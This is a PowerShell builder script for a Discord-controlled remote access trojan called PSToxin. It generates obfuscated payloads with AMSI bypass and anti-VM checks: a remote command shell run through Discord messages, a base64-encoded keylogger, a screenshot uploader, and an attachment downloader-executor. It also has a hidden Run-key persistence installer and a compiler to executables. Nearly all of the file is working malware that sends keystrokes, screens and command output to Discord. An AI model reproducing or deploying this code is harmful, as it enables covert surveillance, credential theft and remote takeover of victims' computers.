gc obfuscate.ps1|out-string|iex
function Write-Sync {
	param($str, [switch]$read)
	$i = 0
	$colors = "91", "93", "92", "96", "94", "95"
	$newstr = ($str -split '' | ? {$_} | % {"$([char]27)[$($colors[$i % 6])m$([char]$_)$([char]27)[0m";$i++}) -join ''
	[Console]::Write($newstr)
	if ($read) {
		Read-Host
	}
}
function Write-Async {
	param($text, $delay = 50)
	$ps = [powershell]::Create()
	$null = $ps.AddScript({
		param($text, $delay)
		function rainbow {
			param($str, [int]$rot)
			$i = 0
			$colors = "91", "93", "92", "96", "94", "95"
			if ($rot) {$colors = $colors[-$rot..-1] + $colors[0..($colors.length - $rot - 1)]}
			$newstr = ($str -split '' | ? {$_} | % {"$([char]27)[$($colors[$i % 6])m$([char]$_)$([char]27)[0m";$i++}) -join ''
			[Console]::WriteLine($newstr)
		}
		$i = 0
		while ($true) {
			[Console]::CursorVisible = $false
			rainbow $text -r $i
			sleep -m $delay
			[Console]::Clear()
			$i++
			$i %= 6
		}
	}).AddArgument($text).AddArgument($delay)
	$null = $ps.BeginInvoke()
	return $ps
}
function Get-Choice {
	param($text)
	Write-Sync "$text (Y/N)"
	$choice = "X"
	while ($choice -ne "Y") {
		$choice = [Console]::ReadKey($true).Key
		if ($choice -eq "N") {
			return $false
		}
	}
	return $true
}
$logo = [char[]](9556, 9552, 9559, 32, 9556, 9552, 9569, 32, 9566, 9552, 9574, 9552, 9569, 32, 9556, 9552, 9559, 32, 9566, 9559, 9556, 9552, 9569, 32, 9573, 32, 9556, 9559, 32, 9573, 10, 9568, 9552, 9565, 32, 9562, 9552, 9559, 32, 32, 32, 9553, 32, 32, 32, 9553, 32, 9553, 32, 32, 9562, 9580, 9559, 32, 32, 9553, 32, 9553, 9562, 9559, 9553, 10, 9576, 32, 32, 32, 9566, 9552, 9565, 32, 32, 32, 9576, 32, 32, 32, 9562, 9552, 9565, 32, 9566, 9552, 9565, 9562, 9569, 32, 9576, 32, 9576, 32, 9562, 9565) -join ''
if (Test-Path "$pwd\client.config") {
	$cfg = gc "$pwd\client.config"
	$token = $cfg[0]
	$svrid = $cfg[1]
	$compile = [bool]::Parse($cfg[2])
	$key = $cfg[3]
}
else {
	Write-Sync "$logo`n`n`n`n`n"
	$token = Write-Sync "Discord Bot Token: " -r
	$svrid = Write-Sync "Discord Server ID: " -r
	$compile = Get-Choice "Compile payload into a Windows executable?"
	[Console]::WriteLine()
	$key = [Security.Cryptography.AES]::Create().Key -join ","
	if (Get-Choice "Generate config?") {
		sc "client.config" "$token`n$svrid`n$compile`n$key"
	}
	Sleep 1
	[Console]::Clear()
}
$encrypted_extension = ".encrypted" # this is the extension used by the encryptor and attachment handler for special encrypted attachments, the default extension is ".encrypted"
$use_older_commentgen_system = $false # this is an advanced option that uses a simpler comment generation system, it is disabled by default
$autorunreg = (Get-Random $wordlist -c 2) -join " "
$temp = Write-Async "Obfuscating command line..."
$commandline = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Invoke-PSObfuscation ($decryptor_func + $amsi + ';$w=&"New-Object" "Net.WebClient";$w."Headers"."add"("Authorization", "Bot ' + $token + '");$cid = (($w."DownloadString"("https://discord.com/api/v10/guilds/' + $svrid + '/channels") | &"ConvertFrom-Json") | &"?" {$_."name" -eq ((&"gpv" "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGUID") + "_cl")})."id";while (' + $trueobf + ') {$w."Headers"["Content-Type"] = "application/json";$r=$w."DownloadString"("https://discord.com/api/v10/channels/" + $cid + "/messages");$z=$r|&"ConvertFrom-Json";$cmd=$z | &"?" { -not $_."author"."bot" } | &"select" -f 1;if ($cmd."content" -eq $pcmd) {&"sleep" 5} elseif ($cmd."attachments"."count" -gt 0) {} else {try {$out=&"iex" $cmd."content"|&"Out-String";if (-not $out) {$out="(no output)"}} catch {$out = $_."Exception"."Message"};if ($out."Length" -gt 2000) {$x2 = for ($i = 0; $i -lt $out."Length"; $i += 2000) {$out."Substring"($i, ([type]"Math")::"Min"."invoke"(2000, $out."Length" - $i))};foreach ($out2 in $x2) {$x=@{ content = $out2 } | &"ConvertTo-Json";$w."Headers"["Content-Type"] = "application/json";$w."UploadString"("https://discord.com/api/v10/channels/" + $cid + "/messages", "POST", $x);&"sleep" 1}}else {$w."Headers"["Content-Type"] = "application/json";$x=@{ content = $out } | &"ConvertTo-Json";$w."UploadString"("https://discord.com/api/v10/channels/" + $cid + "/messages", "POST", $x)};$pcmd = $cmd."content"}}'))))
$temp.Stop()
# credits: https://github.com/sasqwatch/FunnyKeylogger/
[Console]::Clear()
$temp = Write-Async "Obfuscating keylogger..."
$keylogger = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Invoke-PSObfuscation ($decryptor_func + $amsi + ';$w=&"New-Object" "Net.WebClient";$w."Headers"."add"("Authorization", "Bot ' + $token + '");$cid = (($w."DownloadString"("https://discord.com/api/v10/guilds/' + $svrid + '/channels") | &"ConvertFrom-Json") | &"?" {$_."name" -eq ((&"gpv" "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGUID") + "_kl")})."id";&"Add-Type" (([type]"Text.Encoding")::"UTF8"."GetString"(([type]"Convert")::"FromBase64String"."invoke"("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uTmV0Lkh0dHA7CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmcuVGFza3M7CnVzaW5nIFN5c3RlbS5EaWFnbm9zdGljczsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsKcHVibGljIHN0YXRpYyBjbGFzcyBQcm9ncmFtCnsKCXByaXZhdGUgc3RhdGljIHN0cmluZyBDSUQ7Cglwcml2YXRlIHN0YXRpYyBzdHJpbmcgVG9rZW47Cglwcml2YXRlIHN0YXRpYyBpbnQgaXRlciA9IDA7Cglwcml2YXRlIHN0YXRpYyBTdHJpbmdCdWlsZGVyIGJ1ZiA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7Cglwcml2YXRlIHN0YXRpYyBIb29rUHJvYyBob29rUHJvYyA9IEhvb2tDYWxsYmFjazsKCXByaXZhdGUgc3RhdGljIEludFB0ciBob29rSWQgPSBJbnRQdHIuWmVybzsKCXB1YmxpYyBzdGF0aWMgdm9pZCBTdGFydChzdHJpbmcgdG9rZW4sIHN0cmluZyBjaGFubmVsSWQpIHsKCQlUb2tlbj10b2tlbjsKCQlDSUQ9Y2hhbm5lbElkOwoJCWhvb2tJZCA9IFNldEhvb2soaG9va1Byb2MpOwoJCUFwcGxpY2F0aW9uLlJ1bigpOwoJCVVuaG9va1dpbmRvd3NIb29rRXgoaG9va0lkKTsKCX0KCXByaXZhdGUgc3RhdGljIEludFB0ciBTZXRIb29rKEhvb2tQcm9jIGhvb2tQcm9jKQoJewoJCUludFB0ciBtb2R1bGVIYW5kbGUgPSBHZXRNb2R1bGVIYW5kbGUoUHJvY2Vzcy5HZXRDdXJyZW50UHJvY2VzcygpLk1haW5Nb2R1bGUuTW9kdWxlTmFtZSk7CgkJcmV0dXJuIFNldFdpbmRvd3NIb29rRXgoMTMsIGhvb2tQcm9jLCBtb2R1bGVIYW5kbGUsIDApOwoJfQoJcHJpdmF0ZSBkZWxlZ2F0ZSBJbnRQdHIgSG9va1Byb2MoaW50IG5Db2RlLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKTsKCXByaXZhdGUgc3RhdGljIGFzeW5jIFRhc2sgU2VuZE1lc3NhZ2VBc3luYyhzdHJpbmcgdG9rZW4sIHN0cmluZyBjaGFubmVsSWQsIHN0cmluZyBtZXNzYWdlKQoJewoJCXVzaW5nICh2YXIgY2xpZW50ID0gbmV3IEh0dHBDbGllbnQoKSkKCQl7CgkJCWNsaWVudC5EZWZhdWx0UmVxdWVzdEhlYWRlcnMuQWRkKCJBdXRob3JpemF0aW9uIiwgIkJvdCAiK3Rva2VuKTsKCQkJdmFyIG1lc3NhZ2VEYXRhID0gbmV3CgkJCXsKCQkJCWNvbnRlbnQgPSBtZXNzYWdlCgkJCX07CgoJCQlzdHJpbmcganNvbkNvbnRlbnQgPSAie1wiY29udGVudFwiOlwiIittZXNzYWdlKyJcIn0iOwoKCQkJdmFyIGNvbnRlbnQgPSBuZXcgU3RyaW5nQ29udGVudChqc29uQ29udGVudCxFbmNvZGluZy5VVEY4LCJhcHBsaWNhdGlvbi9qc29uIik7CgoJCQlhd2FpdCBjbGllbnQuUG9zdEFzeW5jKCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92MTAvY2hhbm5lbHMvIitjaGFubmVsSWQrIi9tZXNzYWdlcyIsIGNvbnRlbnQpOwoJCX0KCX0KCXByaXZhdGUgc3RhdGljIEludFB0ciBIb29rQ2FsbGJhY2soaW50IG5Db2RlLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKQoJewoJCWlmIChuQ29kZSA+PSAwICYmIHdQYXJhbSA9PSAoSW50UHRyKTB4MDEwMCkKCQl7CgkJCWludCB2a0NvZGUgPSBNYXJzaGFsLlJlYWRJbnQzMihsUGFyYW0pOwoJCQlpdGVyKys7CgkJCXN0cmluZyBrZXkgPSAoKEtleXMpdmtDb2RlKS5Ub1N0cmluZygpOwoJCQlpZiAoa2V5Lkxlbmd0aCA+IDEpCgkJCQlrZXkgPSBzdHJpbmcuRm9ybWF0KCJbezB9XSAiLCBrZXkpOwoJCQlidWYuQXBwZW5kKGtleSk7CgkJCWlmIChpdGVyID09IDEwMCkgewoJCQkJdmFyIF8gPSBTZW5kTWVzc2FnZUFzeW5jKFRva2VuLCBDSUQsIGJ1Zi5Ub1N0cmluZygpKTsKCQkJCWJ1Zi5DbGVhcigpOwoJCQkJaXRlciA9IDA7CgkJCX0KCQl9CgkJcmV0dXJuIENhbGxOZXh0SG9va0V4KGhvb2tJZCwgbkNvZGUsIHdQYXJhbSwgbFBhcmFtKTsKCX0KCVtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0KCXByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFVuaG9va1dpbmRvd3NIb29rRXgoSW50UHRyIGhoayk7CgoJW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCglwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldE1vZHVsZUhhbmRsZShzdHJpbmcgbHBNb2R1bGVOYW1lKTsKCglbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCglwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIENhbGxOZXh0SG9va0V4KEludFB0ciBoaGssIGludCBuQ29kZSwgSW50UHRyIHdQYXJhbSwgSW50UHRyIGxQYXJhbSk7CgoJW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQoJcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBTZXRXaW5kb3dzSG9va0V4KGludCBpZEhvb2ssIEhvb2tQcm9jIGxwZm4sIEludFB0ciBoTW9kLCB1aW50IGR3VGhyZWFkSWQpOwp9"))) -r "System.Windows.Forms", "System.Net.Http";([type]"Program")::"Start"."invoke"("' + $token + '",$cid)'))))
$temp.Stop()
[Console]::Clear()
$temp = Write-Async "Obfuscating screen logger..."
$screencapture = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Invoke-PSObfuscation ($decryptor_func + $amsi + ';$w=&"New-Object" "Net.WebClient";$w."Headers"."add"("Authorization", "Bot ' + $token + '");$cid = (($w."DownloadString"("https://discord.com/api/v10/guilds/' + $svrid + '/channels") | &"ConvertFrom-Json") | &"?" {$_."name" -eq ((&"gpv" "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGUID") + "_sc")})."id";&"Add-Type" -A "System.Drawing","System.Net.Http";while (' + $trueobf + ') {$g=&"new-guid";$res = (&"gwmi" "Win32_VideoController")."VideoModeDescription"-split" x ";$width = [int]$res[0];$height = [int]$res[1];$bitmap = &"New-Object" "Drawing.Bitmap" $width, $height;$graphics = ([type]"Drawing.Graphics")::"FromImage"."invoke"($bitmap);$graphics."CopyFromScreen"(0,0,0,0,(&"New-Object" "Drawing.Size" $width, $height));$bitmap."Save"("$env:temp/$g.png");$client = &"New-Object" "Net.Http.HttpClient";$client."DefaultRequestHeaders"."Authorization" = &"New-Object" "Net.Http.Headers.AuthenticationHeaderValue"("Bot", "' + $token + '");$content = &"New-Object" "Net.Http.MultipartFormDataContent";$fileContent = &"New-Object" "Net.Http.ByteArrayContent"(,([type]"IO.File")::"ReadAllBytes"."invoke"("$env:Temp/$g.png"));$fileContent."Headers"."ContentType" = ([type]"Net.Http.Headers.MediaTypeHeaderValue")::"Parse"."invoke"("image/png");$content."add"($fileContent, "files[0]", "screen.png");$client."PostAsync"("https://discord.com/api/v10/channels/" + $cid + "/messages", $content)."Result";&"ri" "$env:temp/$g.png";&"sleep" 5}'))))
$temp.Stop()
[Console]::Clear()
$temp = Write-Async "Obfuscating attachment handler..."
$attachmenthandler = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Invoke-PSObfuscation ($decryptor_func + $amsi + ';$w=&"New-Object" "Net.WebClient";$w."Headers"."add"("Authorization", "Bot ' + $token + '");$cid = (($w."DownloadString"("https://discord.com/api/v10/guilds/' + $svrid + '/channels") | &"ConvertFrom-Json") | &"?" {$_."name" -eq ((&"gpv" "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGUID") + "_cl")})."id";$w."Headers"."add"("Content-Type", "application/json");while (' + $trueobf + ') {$z=$w."DownloadString"("https://discord.com/api/v10/channels/" + $cid + "/messages") | &"ConvertFrom-Json";$cmd=($z | &"?" { -not $_."author"."bot" } | &"select" -f 1)."attachments";if ($cmd."count" -gt 0) {if ($cmd -ne $pcmd) {$name=$cmd."filename";$content=(&"iwr" $cmd."url" -useb)."Content";if ($name."endswith"("' + $encrypted_extension + '")) {$name=$name-replace"' + $encrypted_extension + '$";$content=' + $decryptor_name + ' $content (' + $key + ') (' + $trueobf + ')};if ($name."endswith"(".ps1")){([type]"Text.Encoding")::"UTF8"."GetString"($content)|&"iex"} else {([type]"IO.File")::"WriteAllBytes"."invoke"($name,$content)};$pcmd = $cmd}};&"sleep" 5}'))))
$temp.Stop()
# function {0} will randomly iterate through keys and will grab bits and pieces of other registry values in the key it chooses, combining them to make its own registry value, which it will then set to the content it was provided
# regautogen will generate a startup entry name, making it an amalgamation of other startup program names
# however, if the user does not have enough programs in startup, it will return a hardcoded name ($autorunreg) that it was provided
[Console]::Clear()
$temp = Write-Async "Obfuscating client installer..."
$script = Invoke-PSObfuscation ($decryptor_func + $anti_vm + $lang_verify + $amsi.replace(";","`n") + ((@'

"PSToxin - https://github.com/Red-Shine/PSToxin-C2/"
&"iex" ("function {0}"+(([type]"Text.Encoding")::"UTF8"."GetString"(([type]"Convert")::"FromBase64String"."invoke"("IHsKCXBhcmFtKCRkYXRhKQoJW3N0cmluZ10ka2V5PSJIS0NVOlxTb2Z0d2FyZSIKCSRrZXlvcHRpb25zX2Z1bmM9e3JldHVybiAoZ2NpICRrZXkpLm5hbWV8JXskXyAtcmVwbGFjZSAiSEtFWV9DVVJSRU5UX1VTRVIiLCJIS0NVOiIgfCA/IHskXyAtbmUgIkhLQ1U6XFNvZnR3YXJlXFBvbGljaWVzIiAtYW5kICRfIC1uZSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXMifX19Cglbc3RyaW5nW11dJGtleW9wdGlvbnM9JiRrZXlvcHRpb25zX2Z1bmMKCXdoaWxlICgkdHJ1ZSkgewoJCXdoaWxlICgka2V5b3B0aW9ucy5jb3VudCAtbmUgMCAtYW5kIFtib29sXShHZXQtUmFuZG9tIDEwKSkgewoJCQkka2V5PUdldC1SYW5kb20gKCRrZXlvcHRpb25zKQoJCQkka2V5b3B0aW9ucz0oZ2NpICgka2V5IC1yZXBsYWNlICJIS0VZX0NVUlJFTlRfVVNFUiIsIkhLQ1U6IikpLm5hbWUKCQl9CgkJJGtleSA9ICRrZXkgLXJlcGxhY2UgIkhLRVlfQ1VSUkVOVF9VU0VSIiwiSEtDVToiCgkJJHByb3BlcnRpZXM9KGdpICRrZXkpLnByb3BlcnR5fD97JF8tbm90bWF0Y2giXkhLRVlfIn0KCQlpZiAoJHByb3BlcnRpZXMuY291bnQtZ3QyKSB7CgkJCWJyZWFrCgkJfQoJCWVsc2UgewoJCQlbc3RyaW5nXSRrZXk9IkhLQ1U6XFNvZnR3YXJlIgoJCQlbc3RyaW5nW11dJGtleW9wdGlvbnM9JiRrZXlvcHRpb25zX2Z1bmMKCQl9Cgl9CgkkcmVnZ2VuPXtyZXR1cm4gKChHZXQtUmFuZG9tICgkcHJvcGVydGllc3wleyRfIC1jc3BsaXQgIlsgXy1dIn18JXskXyAtY3NwbGl0ICIoPz1bQS1aXVthLXpdKSJ9fD97JF8gLW5lICIiIC1hbmQgJF8gLWNub3RtYXRjaCAiXi4kIn0pIC1jIDIpIC1qb2luICIiKX0KCSRyZWd2YWw9JiRyZWdnZW4KCXdoaWxlICgkcmVndmFsIC1pbiAkcHJvcGVydGllcykgewoJCSRyZWd2YWw9JiRyZWdnZW4KCX0KCSRudWxsID0gTmV3LUl0ZW1Qcm9wZXJ0eSAka2V5ICRyZWd2YWwgLXByICJzdHJpbmciIC12ICRkYXRhCglyZXR1cm4gInBvd2Vyc2hlbGwgLWVwIGJ5cGFzcyAtYyAoaWV4IChncHYgJyRrZXknICckcmVndmFsJykpIgp9"))))
$regautogen=&"iex" (([type]"Text.Encoding")::"UTF8"."GetString"(([type]"Convert")::"FromBase64String"."invoke"("e3BhcmFtKCRkYXRhKTskcmVnYXV0b2N1cnJlbnQ9KChnY2ltICJXaW4zMl9TdGFydHVwQ29tbWFuZCIpLm5hbWUpO2lmICgkcmVnYXV0b2N1cnJlbnQuY291bnQgLWd0IDIpIHskcmVnYXV0b3J1bj0oKGdldC1yYW5kb20gKCRyZWdhdXRvY3VycmVudHwleyRfLWNzcGxpdCJbIF8tXSJ9fCV7JF8tY3NwbGl0ICIoPz1bQS1aXVthLXpdKSJ9fD97JF8tbmUiIi1hbmQkXy1jbm90bWF0Y2giXi4kIn0pIC1jIDIpLWpvaW4iIik7d2hpbGUgKCRyZWdhdXRvcnVuIC1pbiAkcmVnYXV0b2N1cnJlbnQpIHskcmVnYXV0b3J1bj0oKGdldC1yYW5kb20gKCRyZWdhdXRvY3VycmVudHwleyRfLWNzcGxpdCJbIF8tXSJ9fCV7JF8tY3NwbGl0ICIoPz1bQS1aXVthLXpdKSJ9fCYiPyJ7JF8tbmUiIi1hbmQkXy1jbm90bWF0Y2giXi4kIn0pIC1jIDIpLWpvaW4iIil9O3JldHVybiAkcmVnYXV0b3J1bn0gZWxzZSB7cmV0dXJuICRkYXRhfX0=")))
$autorun=&$regautogen "{1}"
$mguid = &"gpv" "HKLM:\SOFTWARE\Microsoft\Cryptography" "MachineGUID"
$w=&"New-Object" "Net.WebClient"
$w."Headers"."add"("Authorization", "Bot {6}")
$known = ($w."DownloadString"("https://discord.com/api/v10/guilds/{7}/channels") | &"ConvertFrom-Json")."name"
foreach ($id in ("_cl", "_kl", "_sc")) {{
	if ($known -contains ($mguid + $id)) {{
		continue
	}}
	$body = @{{}}
	$body."Add"("name", $mguid + $id)
	$body."Add"("type", 0)
	$body = $body | &"ConvertTo-Json"
	$w."Headers"["Content-Type"] = "application/json"
	$null = $w."UploadString"("https://discord.com/api/v10/guilds/{7}/channels", "POST", $body)
}}
$cldata={0} (([type]"Text.Encoding")::"UTF8"."GetString"(([type]"Convert")::"FromBase64String"."invoke"("{2}")))
$kldata={0} (([type]"Text.Encoding")::"UTF8"."GetString"(([type]"Convert")::"FromBase64String"."invoke"("{3}")))
$scdata={0} (([type]"Text.Encoding")::"UTF8"."GetString"(([type]"Convert")::"FromBase64String"."invoke"("{4}")))
$ahdata={0} (([type]"Text.Encoding")::"UTF8"."GetString"(([type]"Convert")::"FromBase64String"."invoke"("{5}")))
$null = &"new-itemproperty" "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" $autorun -pr "string" -v ("cmd /c start conhost --headless "+$cldata+";cmd /c start conhost --headless "+$kldata+";cmd /c start conhost --headless " + $scdata + ";cmd /c start conhost --headless "+$ahdata)
&"saps" "conhost" ("--headless "+$cldata)
&"saps" "conhost" ("--headless "+$kldata)
&"saps" "conhost" ("--headless "+$scdata)
&"saps" "conhost" ("--headless "+$ahdata)
'@) -f $resolver_name,$autorunreg,$commandline,$keylogger,$screencapture,$attachmenthandler,$token,$svrid))
<#
	when you (or they) run a client, it creates three new channels:
	command line: (MACHINE_GUID)_cl
	keylogger: (MACHINE_GUID)_kl
	screen capture: (MACHINE_GUID)_sc
	note that MACHINE_GUID is a special guid tied to your (or thier) computer, it is located in "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography" and its name is "MachineGUID" (i know, shocking)
#>
if (!(Test-Path "$pwd\out")) {
	$null = md "$pwd\out"
}
sc "$pwd\out\client.ps1" $script -en utf8
$temp.Stop()
[Console]::Clear()
Write-Sync "Payload written successfully!"
Sleep 1
[Console]::Clear()
if (!$cfg) {
	$temp = Write-Async "Compiling encryptor..."
	$cs = @"
using System.IO;
using System.Security.Cryptography;
class Program
{
	static void Main(string[] args)
	{
		byte[] bytes = File.ReadAllBytes(args[0]);
		Aes aes = Aes.Create();
		aes.Mode = CipherMode.ECB;
		aes.Key = new byte[32]{$key};
		ICryptoTransform encryptor = aes.CreateEncryptor();
		byte[] encryptedBytes = encryptor.TransformFinalBlock(bytes, 0, bytes.Length);
		File.WriteAllBytes(args[0] + "$encrypted_extension", encryptedBytes);
	}
}
"@
	sc "$pwd\out\encryptor.cs" $cs
	[IO.File]::WriteAllBytes("$pwd\out\encryptor.res", @(0,0,0,0,8,0,0,0))
	&"$pwd/compiler/csc" /out:"$pwd\out\encryptor.exe" /t:winexe /win32res:"$pwd\out\encryptor.res" "$pwd\out\encryptor.cs" /nologo
	ri "$pwd\out\encryptor.cs"
	ri "$pwd\out\encryptor.res"
	$temp.Stop()
	[Console]::Clear()
}
function my-ps2exe {
	param($src, $out = ($src -replace '\.[^.]+$'))
	cpi $src $out
	$name = $out -replace '^.*\\'
	$stub = @"
using System;
using System.IO;
using System.Text;
using System.Reflection;
using System.Management.Automation;
class Program {
	static void Main() {
		Stream rsrc = Assembly.GetExecutingAssembly().GetManifestResourceStream("$name");
		string src = new StreamReader(rsrc, Encoding.UTF8).ReadToEnd();
		PowerShell ps = PowerShell.Create();
		ps.AddScript(src);
		ps.Invoke();
	}
}
"@
	sc "$out.cs" $stub
	<#
		dd 8 ; header size (8)
		dd 0 ; resource size (0)
		this resource is basically telling the compiler to add 0 bytes of resources so it doesn't add the stupid version info garbage and manifest
	#>
	[IO.File]::WriteAllBytes("$out.res", @(0,0,0,0,8,0,0,0))
	$asm = [Ref].Assembly.Location
	&"$pwd/compiler/csc" /out:"$out.exe" /res:$out /r:$asm /t:winexe /win32res:"$out.res" "$out.cs" /nologo /o /langversion:7.3
	ri $out
	ri "$out.cs"
	ri "$out.res"
}
if ([bool]$compile) {
	$temp = Write-Async "Compiling payload..."
	my-ps2exe "$pwd\out\client.ps1"
	ri "$pwd\out\client.ps1"
	$temp.Stop()
	[Console]::Clear()
}